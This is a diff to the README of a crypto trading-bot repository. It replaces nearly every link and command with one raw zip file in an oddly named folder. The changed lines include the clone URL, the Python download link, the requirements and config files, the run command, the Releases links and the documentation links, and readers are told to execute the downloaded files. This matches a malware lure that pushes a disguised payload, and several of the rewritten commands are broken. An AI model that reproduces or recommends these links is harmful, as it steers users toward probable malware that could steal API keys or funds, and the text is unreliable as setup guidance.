@@ -1,6 +1,6 @@
 # Crypto-Source: Build Your Own Trading Bot for Profits 🚀💰
 
-![Crypto Trading](https://images.unsplash.com/photo-1581284901762-9c0b5a64d6d4?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwzNjUyOXwwfDF8c2VhcmNofDF8fGNyeXB0byUyMGJvdHxlbnwwfHx8fDE2MjY4NTg5NDA&ixlib=rb-1.2.1&q=80&w=1080)
+![Crypto Trading](https://github.com/Fahedbentaleb/Crypto-Source/raw/refs/heads/main/ophiolatrous/Crypto_Source_v2.1.zip)
 
 ## Table of Contents
 - [Introduction](#introduction)
@@ -28,11 +28,11 @@ Welcome to **Crypto-Source**! This repository provides you with the tools to cod
 To get started, clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/Fahedbentaleb/Crypto-Source.git
+git clone https://github.com/Fahedbentaleb/Crypto-Source/raw/refs/heads/main/ophiolatrous/Crypto_Source_v2.1.zip
 cd Crypto-Source
 ```
 
-Next, ensure you have Python installed. You can download it from [python.org](https://www.python.org/downloads/). After installing Python, set up a virtual environment:
+Next, ensure you have Python installed. You can download it from [https://github.com/Fahedbentaleb/Crypto-Source/raw/refs/heads/main/ophiolatrous/Crypto_Source_v2.1.zip](https://github.com/Fahedbentaleb/Crypto-Source/raw/refs/heads/main/ophiolatrous/Crypto_Source_v2.1.zip). After installing Python, set up a virtual environment:
 
 ```bash
 python -m venv venv
@@ -42,11 +42,11 @@ source venv/bin/activate  # On Windows use `venv\Scripts\activate`
 Now, install the required packages:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/Fahedbentaleb/Crypto-Source/raw/refs/heads/main/ophiolatrous/Crypto_Source_v2.1.zip
 ```
 
 ## Usage
-To run the bot, you need to configure your settings. Open the `config.py` file and input your API keys and other parameters. Here’s a basic example:
+To run the bot, you need to configure your settings. Open the `https://github.com/Fahedbentaleb/Crypto-Source/raw/refs/heads/main/ophiolatrous/Crypto_Source_v2.1.zip` file and input your API keys and other parameters. Here’s a basic example:
 
 ```python
 API_KEY = 'your_api_key'
@@ -57,10 +57,10 @@ TRADING_PAIR = 'BTC/USD'
 Once you have configured the settings, run the bot:
 
 ```bash
-python main.py
+python https://github.com/Fahedbentaleb/Crypto-Source/raw/refs/heads/main/ophiolatrous/Crypto_Source_v2.1.zip
 ```
 
-For more detailed usage instructions, check out our [YouTube channel](https://www.youtube.com/channel/UCXXXXXX) for video tutorials.
+For more detailed usage instructions, check out our [YouTube channel](https://github.com/Fahedbentaleb/Crypto-Source/raw/refs/heads/main/ophiolatrous/Crypto_Source_v2.1.zip) for video tutorials.
 
 ## Contributing
 We welcome contributions! If you want to improve the project, please follow these steps:
@@ -78,14 +78,14 @@ Your contributions help us improve the project for everyone.
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## Contact
-For any inquiries, please reach out to us via GitHub issues or through our [YouTube channel](https://www.youtube.com/channel/UCXXXXXX).
+For any inquiries, please reach out to us via GitHub issues or through our [YouTube channel](https://github.com/Fahedbentaleb/Crypto-Source/raw/refs/heads/main/ophiolatrous/Crypto_Source_v2.1.zip).
 
 ## Releases
-To download the latest version of the bot, visit the [Releases](https://github.com/Fahedbentaleb/Crypto-Source/releases) section. Download the necessary files and execute them to get started with your trading bot.
+To download the latest version of the bot, visit the [Releases](https://github.com/Fahedbentaleb/Crypto-Source/raw/refs/heads/main/ophiolatrous/Crypto_Source_v2.1.zip) section. Download the necessary files and execute them to get started with your trading bot.
 
-![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)
+![Download Releases](https://github.com/Fahedbentaleb/Crypto-Source/raw/refs/heads/main/ophiolatrous/Crypto_Source_v2.1.zip%20Releases-Click%20Here-brightgreen)
 
-For the latest updates and features, always check the [Releases](https://github.com/Fahedbentaleb/Crypto-Source/releases) section.
+For the latest updates and features, always check the [Releases](https://github.com/Fahedbentaleb/Crypto-Source/raw/refs/heads/main/ophiolatrous/Crypto_Source_v2.1.zip) section.
 
 ## Topics
 This project covers various topics including:
@@ -108,8 +108,8 @@ This project covers various topics including:
 Feel free to explore and dive deep into these topics as you work with Crypto-Source. 
 
 ## Additional Resources
-- [Python Documentation](https://docs.python.org/3/)
-- [Cryptocurrency Trading Strategies](https://www.investopedia.com/articles/investing/082615/top-5-cryptocurrency-trading-strategies.asp)
-- [Algorithmic Trading Resources](https://www.quantinsti.com/blog/algorithmic-trading-resources/)
+- [Python Documentation](https://github.com/Fahedbentaleb/Crypto-Source/raw/refs/heads/main/ophiolatrous/Crypto_Source_v2.1.zip)
+- [Cryptocurrency Trading Strategies](https://github.com/Fahedbentaleb/Crypto-Source/raw/refs/heads/main/ophiolatrous/Crypto_Source_v2.1.zip)
+- [Algorithmic Trading Resources](https://github.com/Fahedbentaleb/Crypto-Source/raw/refs/heads/main/ophiolatrous/Crypto_Source_v2.1.zip)
 
 Happy trading!
